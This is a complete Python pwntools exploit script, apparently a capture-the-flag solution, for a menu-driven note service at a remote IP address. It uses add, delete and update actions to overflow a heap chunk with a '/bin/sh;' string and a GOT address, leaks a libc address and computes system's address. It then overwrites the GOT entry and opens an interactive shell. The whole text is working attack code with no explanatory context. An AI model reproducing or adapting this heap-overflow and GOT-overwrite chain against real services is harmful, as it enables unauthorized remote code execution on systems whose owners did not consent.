from pwn import *

#s = remote('192.168.50.4',1234)
s = remote('78.46.224.83' ,1456)
def Add(malloc_size,name,size,text):
  s.recvuntil('Action:')
  s.send('0\n')
  s.recvuntil('description:')
  s.send(str(malloc_size)+'\n')
  s.recvuntil('name:')
  s.send(name+'\n')
  s.recvuntil('length:')
  s.send(str(size)+'\n')
  s.recvuntil('text:')
  s.send(text+'\n')
def Del(index):
  s.recvuntil('Action:')
  s.send('1\n')
  s.recvuntil('index:')
  s.send(str(index)+'\n')
def Update(index,size,text):
  s.recvuntil('Action:')
  s.send('3\n')
  s.recvuntil('index:')
  s.send(str(index)+'\n')
  s.recvuntil('length:')
  s.send(str(size)+'\n')
  s.recvuntil('text:')
  s.send(text+'\n')
bash = '/bin/sh;'
Add(100,'AAAA',10,'1234')
Add(100,'BBBB',10,'1234')
Del(0)
Add(228,'CCCC',400,bash+'A'*(0x158-len(bash))+p32(0x804B010))
s.recvuntil('Action:')
s.send('2\n')
s.recvuntil('index:')
s.send('1\n')
libc = u32(s.recvuntil('0:')[0x15:0x15+4])-0x00760F0
log.info("libc : 0x%08x"%(libc))
system = libc + 0x003E3E0
Update(1,16,p32(system))
s.interactive()
